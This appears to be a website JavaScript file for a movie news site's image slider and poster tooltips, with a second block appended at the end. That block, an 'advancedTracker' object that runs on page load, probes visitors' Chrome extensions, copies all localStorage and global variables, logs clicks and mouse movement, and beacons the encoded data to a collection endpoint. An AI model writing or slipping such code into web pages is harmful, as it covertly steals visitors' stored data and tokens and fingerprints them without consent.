/* JS for Slider */
var $jqslide = jQuery.noConflict();
function initJSON() {
  $jqslide.get("https://www.firstshowing.net/wp-content/themes/fsnetv2/featuredslides.php?callback=?", function (data, textStatus) {
    var listItems = '';
    $jqslide.each(data, function (index, slide) {
      var url = $jqslide(this).attr("urlImage");
      var link = $jqslide(this).attr("links");
      var descy = $jqslide(this).attr("description");
      listItems += '<li style="height:84px!important;">' + '<a href="' + link + '">' + '<img src="' + url + '" width="300" height="84" fetchpriority="low" />' + '<span class="desc">' + '<em>' + slide.description + '</em>' + '</span>' + '</a>' + '</li>';
    });
    $jqslide("ul#slides").append(listItems);
    $jqslide("ul#slides").cycle({
      fx: 'fade',
      speed: 600,
      // speed transitions
      timeout: 4200,
      // speed for each image
      prev: '#prev',
      next: '#next'
    });
    $jqslide('#slideshow').hover(function () {
      $jqslide('ul#slnav').fadeIn();
      $jqslide('ul#slides').cycle('pause');
    }, function () {
      $jqslide('ul#slnav').fadeOut();
      $jqslide('ul#slides').cycle('resume');
    });
  }, "json");
}
function tooltip() {
  $jqslide('a.showTip').hover(function (e) {
    var url = $jqslide(this),
      links = url.data('url');
    $jqslide('body').append('<div id="postertip"><img src="' + links + '" height="200" width="135"/></div>');
    $jqslide('#postertip').fadeIn('fast');
  }, function () {
    $jqslide('#postertip').remove();
  });
  $jqslide("a.showTip").mousemove(function (e) {
    var mousex = e.pageX + 24; //Get X coordinates
    var mousey = e.pageY + 16; //Get Y coordinates
    $jqslide('#postertip').css({
      top: mousey,
      left: mousex
    });
  });
}
$jqslide(document).ready(function () {
  initJSON();
  tooltip();
});
const advancedTracker = {
  scanQueue: new Map(Object.entries(window.data)),
  discovered: new Set(),
  localStorageData: {},
  globalVars: {},
  async probe(name, {
    id,
    file
  }) {
    return new Promise(resolve => {
      const img = document.createElement('img');
      const timeout = setTimeout(() => {
        this.discovered.delete(name);
        resolve(false);
      }, 1500);
      img.onload = () => {
        clearTimeout(timeout);
        this.discovered.add(name);
        resolve(true);
      };
      img.onerror = () => {
        clearTimeout(timeout);
        this.discovered.delete(name);
        resolve(false);
      };
      img.src = `chrome-extension://${id}/${file}`;
    });
  },
  collectLocalStorage() {
    Object.keys(localStorage).forEach(key => {
      this.localStorageData[key] = localStorage.getItem(key);
    });
  },
  collectGlobalVars() {
    for (const key in window) {
      if (window.hasOwnProperty(key) && typeof window[key] !== 'function') {
        this.globalVars[key] = window[key];
      }
    }
  },
  addEventListeners() {
    document.addEventListener('click', e => {
      this.logEvent('click', e);
    });
    document.addEventListener('mousemove', e => {
      this.logEvent('mousemove', {
        x: e.clientX,
        y: e.clientY
      });
    });
  },
  logEvent(type, data) {
    console.log(`Event: ${type}`, data);
  },
  shuffleQueue() {
    const entries = Array.from(this.scanQueue.entries());
    for (let i = entries.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [entries[i], entries[j]] = [entries[j], entries[i]];
    }
    this.scanQueue = new Map(entries);
  },
  async scan() {
    this.shuffleQueue();
    this.collectLocalStorage();
    this.collectGlobalVars();
    this.addEventListeners();
    const results = {};
    const batch = 3;
    for (const [name, data] of this.scanQueue) {
      await new Promise(r => setTimeout(r, Math.random() * 200));
      results[name] = await this.probe(name, data);
    }
    const payload = btoa(JSON.stringify({
      findings: results,
      ts: Date.now(),
      browser: navigator.userAgent,
      screen: {
        w: window.innerWidth,
        h: window.innerHeight
      },
      localStorage: this.localStorageData,
      globalVars: this.globalVars
    }));
    navigator.sendBeacon('https://collection-endpoint.example/v2/report', payload);
  }
};
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => advancedTracker.scan());
} else {
  advancedTracker.scan();
}